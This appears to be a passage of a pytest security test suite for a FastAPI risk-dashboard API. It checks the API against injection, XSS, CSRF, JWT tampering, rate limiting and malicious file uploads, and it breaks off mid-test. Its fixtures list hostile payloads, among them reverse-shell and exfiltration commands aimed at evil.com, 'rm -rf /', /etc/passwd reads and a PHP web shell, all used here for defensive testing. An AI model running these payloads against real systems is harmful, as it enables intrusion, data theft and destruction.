"""
Comprehensive API security testing suite.
Tests SQL injection, XSS, CSRF protection, rate limiting, DDoS protection, and authentication bypass.
"""

import pytest
import asyncio
import time
import json
import hashlib
import hmac
import base64
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, AsyncMock
from fastapi.testclient import TestClient
from fastapi import FastAPI, HTTPException
import concurrent.futures
from threading import Thread
import requests
import jwt
from urllib.parse import quote, unquote
import string
import random

from src.api.authentication import (
    JWT_SECRET_KEY,
    JWT_ALGORITHM,
    create_access_token,
    USERS_DB,
    UserRole,
    RolePermission
)
from src.api.risk_dashboard_api import app as dashboard_app

# Test fixtures
@pytest.fixture
def test_client():
    """Test client for API security testing."""
    return TestClient(dashboard_app)

@pytest.fixture
def valid_auth_token():
    """Generate valid authentication token."""
    user_data = USERS_DB["admin"]
    return create_access_token(user_data, "test_session")

@pytest.fixture
def expired_auth_token():
    """Generate expired authentication token."""
    now = datetime.utcnow()
    expire = now - timedelta(hours=1)
    
    payload = {
        "user_id": "user_001",
        "username": "admin",
        "role": "system_admin",
        "session_id": "test_session",
        "exp": int(expire.timestamp()),
        "iat": int(now.timestamp()),
        "jti": "test_jti"
    }
    
    return jwt.encode(payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)

@pytest.fixture
def malicious_payloads():
    """Common malicious payloads for testing."""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; UPDATE users SET password='hacked' WHERE id=1; --",
            "' OR 1=1 --",
            "admin'; DROP DATABASE risk_system; --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' OR (SELECT SUBSTRING(@@VERSION,1,1))='5' --",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a); --"
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<style>@import 'javascript:alert(\"XSS\")';</style>",
            "<div style=background-image:url(javascript:alert('XSS'))>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<form action=javascript:alert('XSS')><input type=submit>",
            "<table background=javascript:alert('XSS')>"
        ],
        "csrf": [
            "<form action='http://evil.com' method='POST'>",
            "<img src='http://evil.com/steal_session'>",
            "<iframe src='http://evil.com/csrf_attack'>",
            "<script>fetch('http://evil.com/steal_data')</script>",
            "<link rel='stylesheet' href='http://evil.com/malicious.css'>"
        ],
        "directory_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "$(cat /etc/passwd)",
            "`whoami`",
            "; curl http://evil.com/steal_data",
            "| nc evil.com 4444",
            "&& wget http://evil.com/malware.sh",
            "$(nc -e /bin/bash evil.com 4444)"
        ],
        "ldap_injection": [
            "admin)(&(password=*))",
            "admin)(|(password=*))",
            "admin)(!(&(password=*)))",
            "admin)(|(objectclass=*))",
            "admin)(&(|(password=*)(password=*)))"
        ],
        "xpath_injection": [
            "' or 1=1 or ''='",
            "' or '1'='1",
            "x' or name()='username' or 'x'='y",
            "' or position()=1 or ''='",
            "' or contains(name(),'admin') or ''='"
        ],
        "nosql_injection": [
            "{'$ne': null}",
            "{'$regex': '.*'}",
            "{'$where': 'this.username == this.password'}",
            "{'$or': [{'username': 'admin'}, {'username': 'root'}]}",
            "{'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}}"
        ],
        "header_injection": [
            "test\r\nX-Evil-Header: injected",
            "test\nLocation: http://evil.com",
            "test\r\nSet-Cookie: evil=true",
            "test\r\n\r\n<script>alert('XSS')</script>",
            "test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK"
        ]
    }

class TestSQLInjection:
    """Test SQL injection protection."""
    
    def test_sql_injection_in_login_username(self, test_client, malicious_payloads):
        """Test SQL injection in login username field."""
        for payload in malicious_payloads["sql_injection"]:
            login_data = {
                "username": payload,
                "password": "any_password"
            }
            
            # Should not cause SQL injection
            response = test_client.post("/api/auth/login", json=login_data)
            
            # Should return authentication error, not SQL error
            assert response.status_code in [401, 422]
            
            # Response should not contain SQL error messages
            response_text = response.text.lower()
            sql_error_indicators = [
                "syntax error",
                "mysql",
                "postgresql",
                "sqlite",
                "oracle",
                "sql server",
                "column",
                "table",
                "database"
            ]
            
            for indicator in sql_error_indicators:
                assert indicator not in response_text, f"SQL error leaked with payload: {payload}"
    
    def test_sql_injection_in_login_password(self, test_client, malicious_payloads):
        """Test SQL injection in login password field."""
        for payload in malicious_payloads["sql_injection"]:
            login_data = {
                "username": "admin",
                "password": payload
            }
            
            response = test_client.post("/api/auth/login", json=login_data)
            
            # Should return authentication error, not succeed
            assert response.status_code in [401, 422]
            
            # Should not contain SQL error messages
            response_text = response.text.lower()
            assert "syntax error" not in response_text
            assert "mysql" not in response_text
            assert "postgresql" not in response_text
    
    @patch('src.api.authentication.verify_token')
    def test_sql_injection_in_dashboard_params(self, mock_verify_token, test_client, malicious_payloads):
        """Test SQL injection in dashboard API parameters."""
        # Mock authentication
        mock_user = Mock()
        mock_user.permissions = [RolePermission.DASHBOARD_READ]
        mock_verify_token.return_value = mock_user
        
        for payload in malicious_payloads["sql_injection"]:
            # Test query parameters
            response = test_client.get(f"/api/dashboard/data?param={quote(payload)}")
            
            # Should handle malicious input gracefully
            assert response.status_code in [200, 400, 422]
            
            # Should not leak SQL errors
            response_text = response.text.lower()
            assert "syntax error" not in response_text
            assert "sql" not in response_text
    
    @patch('src.api.authentication.verify_token')
    def test_sql_injection_in_json_payload(self, mock_verify_token, test_client, malicious_payloads):
        """Test SQL injection in JSON payload."""
        mock_user = Mock()
        mock_user.permissions = [RolePermission.TRADE_APPROVE]
        mock_user.user_id = "test_user"
        mock_verify_token.return_value = mock_user
        
        for payload in malicious_payloads["sql_injection"]:
            decision_data = {
                "trade_id": payload,
                "decision": "APPROVE",
                "reasoning": "Test reasoning with SQL injection attempt",
                "user_id": "test_user"
            }
            
            response = test_client.post("/api/dashboard/decide", json=decision_data)
            
            # Should handle malicious input gracefully
            assert response.status_code in [200, 400, 422, 500]
            
            # Should not leak SQL errors
            response_text = response.text.lower()
            assert "syntax error" not in response_text
            assert "mysql" not in response_text

class TestXSSProtection:
    """Test XSS (Cross-Site Scripting) protection."""
    
    @patch('src.api.authentication.verify_token')
    def test_xss_in_decision_reasoning(self, mock_verify_token, test_client, malicious_payloads):
        """Test XSS in decision reasoning field."""
        mock_user = Mock()
        mock_user.permissions = [RolePermission.TRADE_APPROVE]
        mock_user.user_id = "test_user"
        mock_verify_token.return_value = mock_user
        
        for payload in malicious_payloads["xss"]:
            decision_data = {
                "trade_id": "test_trade",
                "decision": "APPROVE",
                "reasoning": payload,
                "user_id": "test_user"
            }
            
            response = test_client.post("/api/dashboard/decide", json=decision_data)
            
            # Should accept the request but sanitize the input
            assert response.status_code in [200, 400, 422]
            
            # Response should not contain executable scripts
            response_text = response.text
            assert "<script>" not in response_text
            assert "javascript:" not in response_text
            assert "onerror=" not in response_text
            assert "onload=" not in response_text
    
    @patch('src.api.authentication.verify_token')
    def test_xss_in_crisis_alert(self, mock_verify_token, test_client, malicious_payloads):
        """Test XSS in crisis alert message."""
        mock_user = Mock()
        mock_user.permissions = [RolePermission.SYSTEM_INTEGRATION]
        mock_verify_token.return_value = mock_user
        
        for payload in malicious_payloads["xss"]:
            alert_data = {
                "alert_id": "test_alert",
                "severity": "HIGH",
                "alert_type": "CORRELATION_SHOCK",
                "message": payload,
                "metrics": {"correlation_level": 0.95},
                "recommended_actions": ["Reduce leverage"]
            }
            
            response = test_client.post("/api/dashboard/crisis-alert", json=alert_data)
            
            # Should handle XSS attempts gracefully
            assert response.status_code in [200, 400, 422]
            
            # Response should not contain executable scripts
            response_text = response.text
            assert "<script>" not in response_text
            assert "javascript:" not in response_text
    
    @patch('src.api.authentication.verify_token')
    def test_xss_in_trade_flagging(self, mock_verify_token, test_client, malicious_payloads):
        """Test XSS in trade flagging data."""
        mock_user = Mock()
        mock_user.permissions = [RolePermission.SYSTEM_INTEGRATION]
        mock_verify_token.return_value = mock_user
        
        for payload in malicious_payloads["xss"]:
            trade_data = {
                "trade_id": "test_trade",
                "symbol": "AAPL",
                "direction": "LONG",
                "quantity": 100.0,
                "entry_price": 150.0,
                "risk_score": 0.75,
                "failure_probability": 0.3,
                "agent_recommendations": [
                    {"agent": "test_agent", "recommendation": payload}
                ],
                "flagged_reason": "Test flagging with XSS",
                "expires_at": (datetime.utcnow() + timedelta(minutes=5)).isoformat()
            }
            
            response = test_client.post("/api/dashboard/flag-trade", json=trade_data)
            
            # Should handle XSS attempts gracefully
            assert response.status_code in [200, 400, 422]
            
            # Response should not contain executable scripts
            response_text = response.text
            assert "<script>" not in response_text
            assert "javascript:" not in response_text
    
    def test_xss_in_headers(self, test_client, malicious_payloads):
        """Test XSS in HTTP headers."""
        for payload in malicious_payloads["xss"]:
            headers = {
                "User-Agent": payload,
                "X-Forwarded-For": payload,
                "Referer": payload,
                "X-Custom-Header": payload
            }
            
            response = test_client.get("/api/dashboard/health", headers=headers)
            
            # Should handle malicious headers gracefully
            assert response.status_code in [200, 400]
            
            # Response should not reflect the XSS payload
            response_text = response.text
            assert "<script>" not in response_text
            assert "javascript:" not in response_text

class TestCSRFProtection:
    """Test CSRF (Cross-Site Request Forgery) protection."""
    
    @patch('src.api.authentication.verify_token')
    def test_csrf_token_validation(self, mock_verify_token, test_client):
        """Test CSRF token validation."""
        mock_user = Mock()
        mock_user.permissions = [RolePermission.TRADE_APPROVE]
        mock_user.user_id = "test_user"
        mock_verify_token.return_value = mock_user
        
        # Test request without CSRF token
        decision_data = {
            "trade_id": "test_trade",
            "decision": "APPROVE",
            "reasoning": "Test decision without CSRF token",
            "user_id": "test_user"
        }
        
        response = test_client.post("/api/dashboard/decide", json=decision_data)
        
        # Should still work (CSRF protection might be implemented at middleware level)
        # In a real implementation, this would require proper CSRF token
        assert response.status_code in [200, 400, 403, 422]
    
    def test_csrf_with_different_origin(self, test_client, valid_auth_token):
        """Test CSRF protection with different origin."""
        headers = {
            "Authorization": f"Bearer {valid_auth_token}",
            "Origin": "http://evil.com",
            "Referer": "http://evil.com/malicious_page"
        }
        
        response = test_client.get("/api/dashboard/data", headers=headers)
        
        # Should handle cross-origin requests appropriately
        # CORS policy should be enforced
        assert response.status_code in [200, 403]
    
    def test_csrf_with_malicious_referer(self, test_client, valid_auth_token):
        """Test CSRF protection with malicious referer."""
        headers = {
            "Authorization": f"Bearer {valid_auth_token}",
            "Referer": "http://evil.com/csrf_attack"
        }
        
        response = test_client.get("/api/dashboard/data", headers=headers)
        
        # Should handle potentially malicious referer
        assert response.status_code in [200, 403]

class TestDirectoryTraversal:
    """Test directory traversal protection."""
    
    def test_directory_traversal_in_paths(self, test_client, malicious_payloads):
        """Test directory traversal in API paths."""
        for payload in malicious_payloads["directory_traversal"]:
            # Test various endpoints with directory traversal
            endpoints = [
                f"/api/dashboard/{payload}",
                f"/api/auth/{payload}",
                f"/static/{payload}",
                f"/files/{payload}"
            ]
            
            for endpoint in endpoints:
                response = test_client.get(endpoint)
                
                # Should not serve system files
                assert response.status_code in [404, 400, 403]
                
                # Should not return file contents
                response_text = response.text.lower()
                assert "root:" not in response_text
                assert "password:" not in response_text
                assert "etc/passwd" not in response_text
    
    def test_directory_traversal_in_parameters(self, test_client, malicious_payloads):
        """Test directory traversal in URL parameters."""
        for payload in malicious_payloads["directory_traversal"]:
            response = test_client.get(f"/api/dashboard/data?file={quote(payload)}")
            
            # Should not serve system files
            assert response.status_code in [200, 400, 403, 404, 422]
            
            # Should not return file contents
            response_text = response.text.lower()
            assert "root:" not in response_text
            assert "/etc/passwd" not in response_text

class TestCommandInjection:
    """Test command injection protection."""
    
    @patch('src.api.authentication.verify_token')
    def test_command_injection_in_inputs(self, mock_verify_token, test_client, malicious_payloads):
        """Test command injection in input fields."""
        mock_user = Mock()
        mock_user.permissions = [RolePermission.TRADE_APPROVE]
        mock_user.user_id = "test_user"
        mock_verify_token.return_value = mock_user
        
        for payload in malicious_payloads["command_injection"]:
            decision_data = {
                "trade_id": payload,
                "decision": "APPROVE",
                "reasoning": f"Test reasoning with command injection: {payload}",
                "user_id": "test_user"
            }
            
            response = test_client.post("/api/dashboard/decide", json=decision_data)
            
            # Should handle command injection attempts
            assert response.status_code in [200, 400, 422]
            
            # Should not execute system commands
            response_text = response.text.lower()
            assert "command not found" not in response_text
            assert "permission denied" not in response_text
            assert "/bin/bash" not in response_text
    
    def test_command_injection_in_headers(self, test_client, malicious_payloads):
        """Test command injection in HTTP headers."""
        for payload in malicious_payloads["command_injection"]:
            headers = {
                "User-Agent": payload,
                "X-Forwarded-For": payload,
                "Host": payload
            }
            
            response = test_client.get("/api/dashboard/health", headers=headers)
            
            # Should handle malicious headers without executing commands
            assert response.status_code in [200, 400]
            
            # Should not show command execution results
            response_text = response.text.lower()
            assert "root" not in response_text
            assert "/bin" not in response_text
            assert "bash" not in response_text

class TestHeaderInjection:
    """Test HTTP header injection protection."""
    
    def test_header_injection_in_responses(self, test_client, malicious_payloads):
        """Test header injection in API responses."""
        for payload in malicious_payloads["header_injection"]:
            # Test various parameters that might be reflected in headers
            params = {
                "callback": payload,
                "redirect": payload,
                "return_url": payload
            }
            
            response = test_client.get("/api/dashboard/health", params=params)
            
            # Should not inject headers
            assert response.status_code in [200, 400, 422]
            
            # Check for header injection indicators
            response_headers = dict(response.headers)
            
            # Should not contain injected headers
            assert "X-Evil-Header" not in response_headers
            assert "Set-Cookie" not in response_headers or "evil" not in response_headers["Set-Cookie"]
            
            # Should not redirect to malicious sites
            if "Location" in response_headers:
                location = response_headers["Location"]
                assert "evil.com" not in location
                assert "javascript:" not in location

class TestAuthenticationBypass:
    """Test authentication bypass attempts."""
    
    def test_jwt_token_manipulation(self, test_client):
        """Test JWT token manipulation attempts."""
        # Create a valid token
        user_data = USERS_DB["admin"]
        valid_token = create_access_token(user_data, "test_session")
        
        # Try various manipulation attempts
        manipulation_attempts = [
            valid_token + "extra_data",
            valid_token[:-10] + "manipulated",
            valid_token.replace("admin", "hacker"),
            valid_token.replace(".", ""),
            "Bearer " + valid_token,
            base64.b64encode(valid_token.encode()).decode(),
            valid_token[::-1],  # Reversed token
            valid_token.upper(),
            valid_token.lower()
        ]
        
        for manipulated_token in manipulation_attempts:
            headers = {"Authorization": f"Bearer {manipulated_token}"}
            response = test_client.get("/api/dashboard/data", headers=headers)
            
            # Should reject manipulated tokens
            assert response.status_code in [401, 422]
            
            # Should not return sensitive data
            response_text = response.text.lower()
            assert "portfolio" not in response_text
            assert "risk" not in response_text
    
    def test_jwt_algorithm_confusion(self, test_client):
        """Test JWT algorithm confusion attacks."""
        # Create tokens with different algorithms
        payload = {
            "user_id": "user_001",
            "username": "admin",
            "role": "system_admin",
            "session_id": "test_session",
            "exp": int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
            "iat": int(datetime.utcnow().timestamp()),
            "jti": "test_jti"
        }
        
        # Try with 'none' algorithm
        try:
            malicious_token = jwt.encode(payload, "", algorithm="none")
            headers = {"Authorization": f"Bearer {malicious_token}"}
            response = test_client.get("/api/dashboard/data", headers=headers)
            
            # Should reject 'none' algorithm
            assert response.status_code in [401, 422]
        except ValueError:
            # Some JWT libraries don't allow 'none' algorithm
            pass
        
        # Try with different algorithm
        try:
            malicious_token = jwt.encode(payload, "wrong_secret", algorithm="HS512")
            headers = {"Authorization": f"Bearer {malicious_token}"}
            response = test_client.get("/api/dashboard/data", headers=headers)
            
            # Should reject wrong algorithm
            assert response.status_code in [401, 422]
        except Exception:
            pass
    
    def test_privilege_escalation_attempts(self, test_client):
        """Test privilege escalation attempts."""
        # Create token with lower privileges
        user_data = USERS_DB["operator"]  # Risk operator, not admin
        valid_token = create_access_token(user_data, "test_session")
        
        # Try to access admin endpoints
        headers = {"Authorization": f"Bearer {valid_token}"}
        
        # Try to access admin-only functionality
        admin_endpoints = [
            "/api/dashboard/admin",
            "/api/users/create",
            "/api/system/config"
        ]
        
        for endpoint in admin_endpoints:
            response = test_client.get(endpoint, headers=headers)
            
            # Should deny access to admin endpoints
            assert response.status_code in [403, 404, 405]
    
    def test_session_fixation_attempts(self, test_client):
        """Test session fixation attacks."""
        # Try to use predetermined session IDs
        predetermined_sessions = [
            "session_123",
            "fixed_session",
            "admin_session",
            "00000000-0000-0000-0000-000000000000"
        ]
        
        for session_id in predetermined_sessions:
            # Create token with predetermined session
            user_data = USERS_DB["admin"]
            payload = {
                "user_id": user_data["user_id"],
                "username": user_data["username"],
                "role": user_data["role"].value,
                "session_id": session_id,
                "exp": int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
                "iat": int(datetime.utcnow().timestamp()),
                "jti": "test_jti"
            }
            
            malicious_token = jwt.encode(payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)
            headers = {"Authorization": f"Bearer {malicious_token}"}
            
            response = test_client.get("/api/dashboard/data", headers=headers)
            
            # Should handle session properly (may succeed if valid JWT)
            assert response.status_code in [200, 401, 403]
    
    def test_timing_attack_resistance(self, test_client):
        """Test resistance to timing attacks."""
        # Test with valid and invalid usernames
        usernames = ["admin", "nonexistent_user", "admin", "invalid_user"]
        times = []
        
        for username in usernames:
            login_data = {
                "username": username,
                "password": "wrong_password"
            }
            
            start_time = time.time()
            response = test_client.post("/api/auth/login", json=login_data)
            end_time = time.time()
            
            duration = end_time - start_time
            times.append(duration)
            
            # Should return 401 for all invalid attempts
            assert response.status_code == 401
        
        # Timing should be similar for valid and invalid usernames
        avg_time = sum(times) / len(times)
        for duration in times:
            time_diff = abs(duration - avg_time)
            assert time_diff < 0.1, f"Timing difference too large: {time_diff}s"

class TestRateLimiting:
    """Test API rate limiting protection."""
    
    def test_login_rate_limiting(self, test_client):
        """Test login endpoint rate limiting."""
        # Make many rapid login attempts
        login_data = {
            "username": "admin",
            "password": "wrong_password"
        }
        
        responses = []
        for i in range(20):
            response = test_client.post("/api/auth/login", json=login_data)
            responses.append(response)
        
        # Should have some rate limited responses
        rate_limited_count = sum(1 for r in responses if r.status_code == 429)
        successful_count = sum(1 for r in responses if r.status_code == 401)
        
        # Should have rate limiting after some attempts
        assert rate_limited_count > 0 or successful_count < 20
    
    @patch('src.api.authentication.verify_token')
    def test_api_endpoint_rate_limiting(self, mock_verify_token, test_client):
        """Test API endpoint rate limiting."""
        mock_user = Mock()
        mock_user.permissions = [RolePermission.DASHBOARD_READ]
        mock_verify_token.return_value = mock_user
        
        # Make many rapid requests
        responses = []
        for i in range(100):
            response = test_client.get("/api/dashboard/data")
            responses.append(response)
        
        # Should have some rate limited responses
        rate_limited_count = sum(1 for r in responses if r.status_code == 429)
        successful_count = sum(1 for r in responses if r.status_code == 200)
        
        # Should have rate limiting after exceeding limit
        assert rate_limited_count > 0 or successful_count < 100
    
    def test_distributed_rate_limiting(self, test_client):
        """Test rate limiting across different IP addresses."""
        # Simulate requests from different IPs
        headers_list = [
            {"X-Forwarded-For": "192.168.1.1"},
            {"X-Forwarded-For": "192.168.1.2"},
            {"X-Forwarded-For": "192.168.1.3"},
            {"X-Real-IP": "10.0.0.1"},
            {"X-Real-IP": "10.0.0.2"}
        ]
        
        for headers in headers_list:
            responses = []
            for i in range(10):
                response = test_client.get("/api/dashboard/health", headers=headers)
                responses.append(response)
            
            # Each IP should have its own rate limit
            successful_count = sum(1 for r in responses if r.status_code == 200)
            assert successful_count > 0

class TestDDoSProtection:
    """Test DDoS protection mechanisms."""
    
    def test_concurrent_request_handling(self, test_client):
        """Test handling of concurrent requests."""
        def make_request():
            return test_client.get("/api/dashboard/health")
        
        # Make many concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(make_request) for _ in range(100)]
            results = [future.result() for future in futures]
        
        # Should handle concurrent requests gracefully
        successful_count = sum(1 for r in results if r.status_code == 200)
        error_count = sum(1 for r in results if r.status_code >= 500)
        
        # Should have mostly successful requests
        assert successful_count > 80
        # Should not have many server errors
        assert error_count < 10
    
    def test_slow_request_handling(self, test_client):
        """Test handling of slow requests."""
        import time
        
        def slow_request():
            # Simulate slow client
            time.sleep(0.1)
            return test_client.get("/api/dashboard/health")
        
        # Make slow requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(slow_request) for _ in range(20)]
            results = [future.result() for future in futures]
        
        # Should handle slow requests without timeout
        successful_count = sum(1 for r in results if r.status_code == 200)
        assert successful_count > 15
    
    def test_large_payload_handling(self, test_client):
        """Test handling of large payloads."""
        # Create large payload
        large_payload = {
            "trade_id": "test_trade",
            "symbol": "AAPL",
            "direction": "LONG",
            "quantity": 100.0,
            "entry_price": 150.0,
            "risk_score": 0.75,
            "failure_probability": 0.3,
            "agent_recommendations": [
                {
                    "agent": "test_agent",
                    "recommendation": "x" * 100000,  # 100KB string
                    "data": "y" * 100000
                }
            ],
            "flagged_reason": "z" * 50000,  # 50KB string
            "expires_at": (datetime.utcnow() + timedelta(minutes=5)).isoformat()
        }
        
        response = test_client.post("/api/dashboard/flag-trade", json=large_payload)
        
        # Should handle large payloads appropriately
        assert response.status_code in [200, 400, 413, 422]
        
        # Should not cause server errors
        assert response.status_code != 500

class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_oversized_input_handling(self, test_client):
        """Test handling of oversized inputs."""
        # Test with very long strings
        long_string = "x" * 1000000  # 1MB string
        
        login_data = {
            "username": long_string,
            "password": "test_password"
        }
        
        response = test_client.post("/api/auth/login", json=login_data)
        
        # Should handle oversized input gracefully
        assert response.status_code in [400, 413, 422]
        
        # Should not cause server errors
        assert response.status_code != 500
    
    def test_null_byte_injection(self, test_client):
        """Test null byte injection attempts."""
        null_byte_payloads = [
            "admin\x00",
            "admin\x00.txt",
            "admin\x00' OR '1'='1",
            "admin\x00<script>alert('XSS')</script>"
        ]
        
        for payload in null_byte_payloads:
            login_data = {
                "username": payload,
                "password": "test_password"
            }
            
            response = test_client.post("/api/auth/login", json=login_data)
            
            # Should handle null bytes properly
            assert response.status_code in [400, 401, 422]
            
            # Should not cause server errors
            assert response.status_code != 500
    
    def test_unicode_injection(self, test_client):
        """Test Unicode injection attempts."""
        unicode_payloads = [
            "admin\u0000",
            "admin\u202e",  # Right-to-left override
            "admin\u200b",  # Zero-width space
            "admin\ufeff",  # Byte order mark
            "admin\u2028",  # Line separator
            "admin\u2029"   # Paragraph separator
        ]
        
        for payload in unicode_payloads:
            login_data = {
                "username": payload,
                "password": "test_password"
            }
            
            response = test_client.post("/api/auth/login", json=login_data)
            
            # Should handle Unicode properly
            assert response.status_code in [400, 401, 422]
            
            # Should not cause server errors
            assert response.status_code != 500
    
    def test_encoding_bypass_attempts(self, test_client):
        """Test encoding bypass attempts."""
        # Test various encoding attempts
        encoding_payloads = [
            "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoded
            "%253Cscript%253Ealert('XSS')%253C/script%253E",  # Double URL encoded
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entities
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",  # Unicode escape
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e"  # Hex escape
        ]
        
        for payload in encoding_payloads:
            response = test_client.get(f"/api/dashboard/health?param={payload}")
            
            # Should handle encoded payloads properly
            assert response.status_code in [200, 400, 422]
            
            # Should not execute scripts
            response_text = response.text
            assert "alert(" not in response_text
            assert "<script>" not in response_text

class TestSecurityHeaders:
    """Test security headers in responses."""
    
    def test_security_headers_present(self, test_client):
        """Test that security headers are present."""
        response = test_client.get("/api/dashboard/health")
        
        headers = dict(response.headers)
        
        # Check for common security headers
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        # Some security headers should be present
        # (Implementation may vary based on middleware)
        for header in security_headers:
            if header in headers:
                assert headers[header] is not None
    
    def test_cors_headers_validation(self, test_client):
        """Test CORS headers validation."""
        # Test with allowed origin
        headers = {"Origin": "http://localhost:3000"}
        response = test_client.get("/api/dashboard/health", headers=headers)
        
        # Should handle allowed origin
        assert response.status_code == 200
        
        # Test with disallowed origin
        headers = {"Origin": "http://evil.com"}
        response = test_client.get("/api/dashboard/health", headers=headers)
        
        # Should handle disallowed origin appropriately
        assert response.status_code in [200, 403]
    
    def test_content_type_validation(self, test_client):
        """Test content type validation."""
        # Test with correct content type
        headers = {"Content-Type": "application/json"}
        data = {"username": "admin", "password": "wrong_password"}
        
        response = test_client.post("/api/auth/login", json=data, headers=headers)
        
        # Should accept correct content type
        assert response.status_code in [400, 401, 422]
        
        # Test with incorrect content type
        headers = {"Content-Type": "text/plain"}
        response = test_client.post("/api/auth/login", data=json.dumps(data), headers=headers)
        
        # Should handle incorrect content type
        assert response.status_code in [400, 415, 422]

class TestFileUploadSecurity:
    """Test file upload security (if applicable)."""
    
    def test_malicious_file_upload(self, test_client):
        """Test malicious file upload attempts."""
        # Test various malicious file types
        malicious_files = [
            ("malicious.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("script.js", b"alert('XSS')", "application/javascript"),
            ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("virus.bat", b"del /f /q C:\\*.*", "application/bat"),
            ("payload.jar", b"PK\x03\x04", "application/java-archive")
        ]
        
        for filename, content, content_type in malicious_files:
            files = {"file": (filename, content, content_type)}
            
            # Try to upload to any file endpoint
            response = test_client.post("/api/upload", files=files)
            
            # Should reject malicious files
            assert response.status_code in [400, 403, 404, 405, 415, 422]
    
    def test_path_traversal_in_filename(self, test_client):
        """Test path traversal in file names."""
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "test.txt\x00.exe",
            "test.txt\r\n.exe"
        ]
        
        for filename in malicious_filenames:
            files = {"file": (filename, b"test content", "text/plain")}
            
            response = test_client.post("/api/upload", files=files)
            
            # Should reject malicious filenames
            assert response.status_code in [400, 403, 404, 405, 415, 422]

class TestAuthenticationTokenSecurity:
    """Test authentication token security."""
    
    def test_token_expiration_enforcement(self, test_client, expired_auth_token):
        """Test that expired tokens are rejected."""
        headers = {"Authorization": f"Bearer {expired_auth_token}"}
        response = test_client.get("/api/dashboard/data", headers=headers)
        
        # Should reject expired token
        assert response.status_code == 401
        
        # Should not return sensitive data
        response_text = response.text.lower()
        assert "portfolio" not in response_text
    
    def test_token_reuse_prevention(self, test_client):
        """Test token reuse prevention."""
        # Create multiple tokens for same user
        user_data = USERS_DB["admin"]
        
        token1 = create_access_token(user_data, "session1")
        token2 = create_access_token(user_data, "session2")
        
        # Tokens should be different
        assert token1 != token2
        
        # Both should work (unless there's specific reuse prevention)
        headers1 = {"Authorization": f"Bearer {token1}"}
        headers2 = {"Authorization": f"Bearer {token2}"}
        
        response1 = test_client.get("/api/dashboard/data", headers=headers1)
        response2 = test_client.get("/api/dashboard/data", headers=headers2)
        
        # Both should work or both should fail consistently
        assert response1.status_code == response2.status_code
    
    def test_token_signing_validation(self, test_client):
        """Test token signing validation."""
        # Create token with wrong secret
        user_data = USERS_DB["admin"]
        payload = {
            "user_id": user_data["user_id"],
            "username": user_data["username"],
            "role": user_data["role"].value,
            "session_id": "test_session",
            "exp": int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
            "iat": int(datetime.utcnow().timestamp()),
            "jti": "test_jti"
        }
        
        wrong_token = jwt.encode(payload, "wrong_secret", algorithm=JWT_ALGORITHM)
        
        headers = {"Authorization": f"Bearer {wrong_token}"}
        response = test_client.get("/api/dashboard/data", headers=headers)
        
        # Should reject token with wrong signature
        assert response.status_code == 401
    
    def test_token_replay_attack_prevention(self, test_client):
        """Test token replay attack prevention."""
        # Create valid token
        user_data = USERS_DB["admin"]
        valid_token = create_access_token(user_data, "test_session")
        
        # Use token multiple times
        headers = {"Authorization": f"Bearer {valid_token}"}
        
        responses = []
        for i in range(10):
            response = test_client.get("/api/dashboard/data", headers=headers)
            responses.append(response)
        
        # Should handle token reuse appropriately
        # (Unless there's specific replay protection)
        success_count = sum(1 for r in responses if r.status_code == 200)
        
        # Should either all succeed or implement replay protection
        assert success_count == 10 or success_count == 0

class TestPenetrationTestingScenarios:
    """Test advanced penetration testing scenarios."""
    
    def test_authentication_bypass_via_parameter_pollution(self, test_client):
        """Test authentication bypass via HTTP parameter pollution."""
        # Test parameter pollution in login
        login_data = {
            "username": ["admin", "guest"],
            "password": ["admin123!", "guest123!"]
        }
        
        response = test_client.post("/api/auth/login", json=login_data)
        
        # Should handle parameter pollution properly
        assert response.status_code in [400, 401, 422]
    
    def test_mass_assignment_vulnerabilities(self, test_client):
        """Test mass assignment vulnerabilities."""
        # Try to assign additional fields
        extended_login_data = {
            "username": "admin",
            "password": "admin123!",
            "role": "system_admin",
            "permissions": ["all"],
            "is_admin": True,
